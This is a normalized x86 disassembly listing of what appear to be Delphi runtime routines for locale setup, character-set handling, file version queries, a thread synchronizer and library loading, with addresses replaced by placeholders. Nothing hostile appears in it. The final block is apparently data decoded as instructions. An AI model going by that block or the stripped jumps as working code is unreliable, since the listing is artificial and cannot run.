xor eax eax
mov [ rw-data ] eax
sub_40bfbc
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404128
sub_40c04c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c122
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f50
lea eax [ ebp - 0x8 ]
call j_sub_404384#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404378
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c129
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c105
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404378
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c140
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c1b8
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404378
mov edx esi
dec edx
call sub_40c140
sub_40c1f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404178
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c21c
pop esi
pop ebx
retn
mov eax ebx
call sub_404178
mov esi eax
sub_40c21c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404178
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c42c
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c274
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404178
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c42c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c42c
dec eax
mov ebx eax
sub_40c304
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404178
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c274
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404178
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c368
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404178
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404178
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c274
mov eax esi
call sub_404178
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404178
mov [ esp ] eax
jmp r-xdata
sub_40c3f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404378
add eax esi
dec eax
call sub_40c3c8
sub_40c42c
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404378
add eax ebx
dec eax
call sub_40c3c8
add eax ebx
sub_40c468
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404178
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c1b8
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c49c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404178
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c1b8
test al al
jne r-xdata
mov eax ebp
call sub_404378
mov dl [ esi + edi - 0x1 ]
call sub_4089f0
test eax eax
setne bl
sub_40c4e0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404378
push eax
mov eax esi
call sub_404378
mov ebp eax
mov eax ebp
pop edx
call sub_40c5a4
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c518
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407ecc
mov eax esi
call sub_404178
mov ebp eax
mov eax edi
mov edx ebp
call sub_404504
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404384
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404384
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404384
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c5a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40886c
mov [ esp ] eax
mov eax ebp
call sub_40886c
mov edi eax
mov edx ebp
mov eax esi
call sub_408a04
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c1dc
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408a04
mov ebx eax
inc ebx
sub_40c644
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c66c
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c66c
test eax eax
jne r-xdata
sub_40c66c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4089f0
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c1dc
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4089f0
mov edi eax
test edi edi
jne r-xdata
sub_40c6ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c710
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404128
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408220
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c717
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_40c720
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c6ac
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c798
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c780
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c720
pop ecx
push ebp
call sub_40c720
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c58
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c90c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cbd7
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c798
call sub_40b0f0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b040
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f0c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408220
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408220
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b08c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b08c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408220
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b08c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b378
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f0c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b378
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f0c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b08c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b040
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f0c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b040
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f0c
lea eax [ ebp - 0x8 ]
call sub_403eb8
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408220
test eax eax
jne r-xdata
call sub_40b2c8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404238
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404238
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b08c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbde
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403edc
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408220
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b040
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408220
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f50
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f50
jmp r-xdata
sub_40cc84
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cda7
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f50
lea eax [ ebp - 0xc ]
mov edx edi
call sub_403f50
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407e98
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407e98
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_403f50
mov eax esi
call sub_403eb8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c4e0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdae
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403edc
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4043d8
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404238
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404178
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_4043d8
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404180
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404178
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404180
jmp r-xdata
sub_40cdc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40ce50
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aff4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce57
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
sub_40cea8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4087f8
mov [ rw-data ] eax
sub_40cf2c
push ebx
push esi
push edi
push ebp
call sub_4034f4
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403118
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_40cf94
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cf7c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d01c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407cd4
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cf1c
mov [ ebp ] eax
sub_40d01c
push ebx
mov ebx eax
mov eax ebx
call sub_40cf7c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cf1c
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d05c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_40d0d0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_40d15c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_40d15c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d118
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cf94
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cf24
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cf04
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cf24
test eax eax
je r-xdata
mov eax edi
call sub_40d118
test bl bl
je r-xdata
mov eax edi
call sub_40d14c
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cf04
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cf10
sub_40d1f8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cf94
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cf24
mov eax ebx
call sub_40d130
mov eax ebx
call sub_40d124
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d00c
sub_40d248
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cf94
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d13c
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cf10
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cf04
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d13c
mov eax esi
call sub_40d130
sub_40d2b4
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cf94
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d00c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cf04
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d130
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d130
sub_40d32c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d350
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d3c7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3ce
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031dc
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d32c
test al al
jne r-xdata
mov al 0x1
sub_40d3e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d45a
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d43c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404378
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d443
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d496
dec eax
add ah bl
mov dl 0x48
add [ ecx + eax * 8 + 0x48 ] ah
add ah dl
mov dl 0x48
add [ edx + eax * 8 ] ch
dec eax
add ah cl
mov dl 0x48
add [ eax + eax * 8 + 0x48 ] al
add ah al
mov dl 0x48
add [ edx + eax * 8 + 0x48 ] bh
jl r-xdata
dec eax
add [ esp + eax * 8 + 0x48 ] bh
add [ edx + esi * 4 + 0x48 ] ch
add [ eax ] bl
retn 0x48
cld
